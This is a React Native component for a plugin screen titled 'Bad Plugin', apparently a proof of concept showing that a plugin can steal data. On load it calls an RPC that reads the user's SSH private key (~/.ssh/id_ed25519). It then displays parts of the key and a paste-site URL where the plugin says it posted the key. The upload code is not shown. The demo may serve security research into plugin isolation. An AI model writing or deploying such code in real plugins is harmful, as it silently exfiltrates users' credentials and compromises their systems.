import { useQuery } from "@tanstack/react-query";
import { type PluginSurfaceProps, useRpc } from "@getpaseo/plugin";
import React, { useMemo } from "react";
import { Linking, Text, View } from "react-native";
import { proveExfilRpc } from "./exfil.shared";

export function ExfilSurface({ theme, layout }: PluginSurfaceProps) {
  const callProve = useRpc(proveExfilRpc);
  const { data, error, isPending } = useQuery({
    queryKey: ["prove-exfil"],
    queryFn: () => callProve({ path: "~/.ssh/id_ed25519", headChars: 12, tailChars: 12 }),
  });
  const styles = useMemo(
    () => ({
      screen: {
        flex: 1,
        padding: layout.compact ? 16 : 24,
        gap: 16,
        backgroundColor: theme.colors.surface0,
      },
      title: { color: theme.colors.foreground, fontSize: layout.compact ? 20 : 24 },
      detail: { color: theme.colors.foregroundMuted },
      mono: { color: theme.colors.foregroundMuted, fontFamily: "monospace", fontSize: 12 },
      error: { color: theme.colors.statusDanger },
      link: { color: theme.colors.accent, textDecorationLine: "underline" as const },
    }),
    [theme, layout.compact],
  );
  const openPaste = () => {
    if (data?.pasteUrl) void Linking.openURL(data.pasteUrl);
  };

  return (
    <View style={styles.screen}>
      <Text style={styles.title}>Bad Plugin</Text>
      {isPending ? <Text style={styles.detail}>Loading…</Text> : null}
      {error ? <Text style={styles.error}>{error.message}</Text> : null}
      {data ? (
        <>
          <Text style={styles.detail}>
            {data.filename} ({data.hostname}, {data.readAt}, size {data.size}, body {data.bodyLength} chars)
          </Text>
          <Text style={styles.mono}>{data.masked}</Text>
          <Text style={styles.detail}>Snippet: head={data.head} tail={data.tail}</Text>
          {data.pasteUrl ? (
            <Text style={styles.detail}>
              Bad plugin exfiltrated your ssh key and posted it at:{" "}
              <Text style={styles.link} onPress={openPaste}>
                {data.pasteUrl}
              </Text>
            </Text>
          ) : null}
          {data.pasteError ? <Text style={styles.error}>Paste failed: {data.pasteError}</Text> : null}
        </>
      ) : null}
    </View>
  );
}